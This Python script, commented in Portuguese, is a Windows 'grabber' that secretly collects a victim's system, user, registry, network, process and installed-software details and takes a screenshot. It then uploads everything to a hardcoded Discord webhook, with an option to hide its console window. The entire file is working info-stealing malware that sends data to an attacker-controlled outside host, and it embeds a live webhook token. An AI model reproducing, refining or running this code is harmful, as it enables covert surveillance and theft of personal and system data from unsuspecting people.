import os
import sys
import platform
import socket
import datetime
import base64
import requests
import subprocess
import json
import winreg
import ctypes
from io import BytesIO
from PIL import ImageGrab  # Alternativa ao pyautogui que funciona melhor no Windows
import threading
import time

# ========== CONFIGURAÇÕES ==========
WEBHOOK_URL = "https://canary.discord.com/api/webhooks/1535328062219231294/RJxr5zI8cJMhjxVQlqQDEfz4QXTZkuemW7ordWMB65qfI4v0CRVzsMeJk5wyOyE2J73J"  # COLE A URL DO SEU WEBHOOK
NOME_ARQUIVO_TXT = "sysinfo.txt"

# ========== FUNÇÃO PARA RODAR INVISÍVEL (SEM CONSOLE) ==========
def rodar_invisivel():
    """Esconde a janela do console (se compilado com --windowed, já funciona)"""
    try:
        # Esconde a janela do console
        wh = ctypes.windll.kernel32.GetConsoleWindow()
        if wh:
            ctypes.windll.user32.ShowWindow(wh, 0)  # 0 = SW_HIDE
    except:
        pass

# ========== COLETORES DE DADOS (VERSÃO WINDOWS) ==========

def coletar_info_sistema():
    """Coleta informações básicas do sistema Windows"""
    info = {}
    
    # Dados básicos
    info["hostname"] = socket.gethostname()
    info["usuario"] = os.getlogin()
    info["sistema"] = platform.system()
    info["versao"] = platform.version()
    info["arquitetura"] = platform.machine()
    info["processador"] = platform.processor()
    info["data_hora"] = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    # Informações do Windows via registro
    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows NT\CurrentVersion") as key:
            info["windows_nome"] = winreg.QueryValueEx(key, "ProductName")[0]
            info["windows_versao"] = winreg.QueryValueEx(key, "CurrentVersion")[0]
            info["windows_build"] = winreg.QueryValueEx(key, "CurrentBuild")[0]
            info["windows_edicao"] = winreg.QueryValueEx(key, "EditionID")[0]
    except:
        info["windows_nome"] = "N/A"
        info["windows_versao"] = "N/A"
        info["windows_build"] = "N/A"
        info["windows_edicao"] = "N/A"
    
    # IP Local (Windows)
    try:
        # Pega o IP da interface ativa
        hostname = socket.gethostname()
        info["ip_local"] = socket.gethostbyname(hostname)
    except:
        info["ip_local"] = "N/A"
    
    # IP Público
    try:
        info["ip_publico"] = requests.get('https://api.ipify.org', timeout=5).text
    except:
        info["ip_publico"] = "N/A"
    
    return info

def coletar_info_usuario():
    """Coleta informações do usuário atual"""
    info = {}
    
    # Variáveis de ambiente importantes
    info["username"] = os.environ.get('USERNAME', 'N/A')
    info["userdomain"] = os.environ.get('USERDOMAIN', 'N/A')
    info["computername"] = os.environ.get('COMPUTERNAME', 'N/A')
    
    # Pastas do usuário
    info["desktop"] = os.path.join(os.environ.get('USERPROFILE', ''), 'Desktop')
    info["documents"] = os.path.join(os.environ.get('USERPROFILE', ''), 'Documents')
    info["downloads"] = os.path.join(os.environ.get('USERPROFILE', ''), 'Downloads')
    
    # Verifica se é admin
    try:
        info["is_admin"] = ctypes.windll.shell32.IsUserAnAdmin() != 0
    except:
        info["is_admin"] = False
    
    return info

def coletar_info_rede():
    """Coleta informações de rede no Windows (ipconfig /all)"""
    try:
        # Usa encoding cp850 para caracteres especiais do Windows
        resultado = subprocess.check_output('ipconfig /all', shell=True, text=True, encoding='cp850')
        return resultado[:1500]  # Limita para não estourar o Discord
    except Exception as e:
        return f"Erro ao coletar informações de rede: {e}"

def tirar_screenshot():
    """Tira print da tela usando PIL (mais compatível com Windows)"""
    try:
        # Captura a tela inteira
        screenshot = ImageGrab.grab()
        
        # Converte para bytes
        buffer = BytesIO()
        screenshot.save(buffer, format='PNG')
        imagem_base64 = base64.b64encode(buffer.getvalue()).decode('utf-8')
        
        return imagem_base64
    except Exception as e:
        return f"Erro no screenshot: {e}"

def coletar_lista_processos():
    """Lista processos em execução no Windows"""
    processos = []
    try:
        resultado = subprocess.check_output('tasklist /v /fo csv', shell=True, text=True, encoding='cp850')
        linhas = resultado.split('\n')
        
        # Pega apenas os 15 primeiros para não estourar o limite
        for linha in linhas[1:16]:
            if linha.strip():
                partes = linha.split(',')
                if len(partes) > 0:
                    nome = partes[0].strip('"')
                    processos.append(nome[:30])
        
        return processos
    except:
        return ["Não foi possível listar processos"]

def coletar_programas_instalados():
    """Lista programas instalados (de ambas as chaves do registro)"""
    programas = []
    caminhos_registro = [
        r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",
        r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"
    ]
    
    for caminho in caminhos_registro:
        try:
            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, caminho) as key:
                i = 0
                while True:
                    try:
                        subkey_name = winreg.EnumKey(key, i)
                        with winreg.OpenKey(key, subkey_name) as subkey:
                            try:
                                nome = winreg.QueryValueEx(subkey, "DisplayName")[0]
                                if nome and len(nome) > 0:
                                    programas.append(nome[:40])
                            except:
                                pass
                        i += 1
                    except WindowsError:
                        break
        except:
            pass
    
    # Remove duplicatas e limita
    programas = list(dict.fromkeys(programas))[:15]
    return programas

def coletar_dados_navegadores():
    """Tenta encontrar dados de navegadores (apenas caminhos)"""
    navegadores = {}
    
    # Chrome
    chrome_path = os.path.expanduser('~') + r'\AppData\Local\Google\Chrome\User Data'
    if os.path.exists(chrome_path):
        navegadores["chrome"] = "Instalado"
    
    # Firefox
    firefox_path = os.path.expanduser('~') + r'\AppData\Roaming\Mozilla\Firefox'
    if os.path.exists(firefox_path):
        navegadores["firefox"] = "Instalado"
    
    # Edge
    edge_path = os.path.expanduser('~') + r'\AppData\Local\Microsoft\Edge\User Data'
    if os.path.exists(edge_path):
        navegadores["edge"] = "Instalado"
    
    return navegadores

# ========== MONTAGEM E ENVIO ==========

def montar_mensagem():
    """Monta a mensagem completa para enviar ao Discord"""
    
    print("[*] Coletando informações do sistema...")
    info_sistema = coletar_info_sistema()
    
    print("[*] Coletando informações do usuário...")
    info_usuario = coletar_info_usuario()
    
    print("[*] Coletando informações de rede...")
    info_rede = coletar_info_rede()
    
    print("[*] Listando programas instalados...")
    programas = coletar_programas_instalados()
    
    print("[*] Listando processos...")
    processos = coletar_lista_processos()
    
    print("[*] Verificando navegadores...")
    navegadores = coletar_dados_navegadores()
    
    print("[*] Capturando screenshot...")
    screenshot_b64 = tirar_screenshot()
    
    # Cria o texto da mensagem
    texto = f"""
╔═══════════════════════════════════════════════════╗
║              🔥 GRABBER WINDOWS 🔥              ║
╚═══════════════════════════════════════════════════╝

📅 DATA/HORA: {info_sistema['data_hora']}

┌─ 💻 SISTEMA
│  • Hostname: {info_sistema['hostname']}
│  • Usuário: {info_sistema['usuario']}
│  • Sistema: {info_sistema['sistema']}
│  • Versão: {info_sistema['versao']}
│  • Arquitetura: {info_sistema['arquitetura']}
│  • Processador: {info_sistema['processador']}

┌─ 🪟 WINDOWS
│  • Produto: {info_sistema['windows_nome']}
│  • Versão: {info_sistema['windows_versao']}
│  • Build: {info_sistema['windows_build']}
│  • Edição: {info_sistema['windows_edicao']}

┌─ 👤 USUÁRIO
│  • Nome: {info_usuario['username']}
│  • Domínio: {info_usuario['userdomain']}
│  • Admin: {info_usuario['is_admin']}
│  • Desktop: {info_usuario['desktop']}

┌─ 🌐 REDE
│  • IP Local: {info_sistema['ip_local']}
│  • IP Público: {info_sistema['ip_publico']}

┌─ 🌐 NAVEGADORES
│  {chr(10).join([f'• {k}: {v}' for k, v in navegadores.items()])}

┌─ 📦 PROGRAMAS INSTALADOS (15 primeiros)
│  {chr(10).join([f'• {p}' for p in programas])}

┌─ ⚙️ PROCESSOS EM EXECUÇÃO (15 primeiros)
│  {chr(10).join([f'• {p}' for p in processos])}

┌─ 📡 INFORMAÇÕES DE REDE (ipconfig)
│  
{info_rede}

╔═══════════════════════════════════════════════════╗
║         ✅ DADOS COLETADOS COM SUCESSO          ║
╚═══════════════════════════════════════════════════╝
"""
    
    return texto, screenshot_b64

def enviar_para_discord(texto, imagem_b64):
    """Envia os dados para o Discord via Webhook"""
    
    print("[*] Enviando dados para o Discord...")
    
    # Prepara o arquivo de texto
    arquivo_txt = BytesIO(texto.encode('utf-8'))
    arquivos = [
        ('file', (NOME_ARQUIVO_TXT, arquivo_txt, 'text/plain'))
    ]
    
    # Adiciona o screenshot se foi capturado com sucesso
    if imagem_b64 and not imagem_b64.startswith("Erro"):
        try:
            imagem_bytes = base64.b64decode(imagem_b64)
            arquivo_img = BytesIO(imagem_bytes)
            arquivos.append(
                ('file', ('screenshot.png', arquivo_img, 'image/png'))
            )
            print("[+] Screenshot anexado!")
        except:
            print("[-] Erro ao anexar screenshot")
    
    # Envia para o Discord
    try:
        resposta = requests.post(WEBHOOK_URL, files=arquivos, timeout=30)
        
        if resposta.status_code == 200:
            print("[+] Dados enviados com sucesso para o Discord!")
            return True
        else:
            print(f"[-] Erro ao enviar: {resposta.status_code}")
            print(f"    Resposta: {resposta.text}")
            return False
            
    except requests.exceptions.Timeout:
        print("[-] Timeout ao enviar dados")
        return False
    except Exception as e:
        print(f"[-] Erro ao enviar: {e}")
        return False

# ========== FUNÇÃO PRINCIPAL ==========

def main():
    """Função principal do grabber"""
    
    try:
        # Opcional: esconde a janela do console
        # rodar_invisivel()
        
        print("=" * 50)
        print("  GRABBER WINDOWS - INICIANDO COLETA")
        print("=" * 50)
        
        # Coleta e monta a mensagem
        texto, imagem = montar_mensagem()
        
        # Envia para o Discord
        sucesso = enviar_para_discord(texto, imagem)
        
        # Finaliza
        if sucesso:
            print("\n[+] Grabber finalizado com sucesso!")
        else:
            print("\n[-] Grabber finalizado com falhas.")
        
        # Aguarda um pouco antes de fechar (para ver os logs)
        time.sleep(3)
        
    except Exception as e:
        print(f"[-] Erro crítico: {e}")
        time.sleep(5)

if __name__ == "__main__":
    main()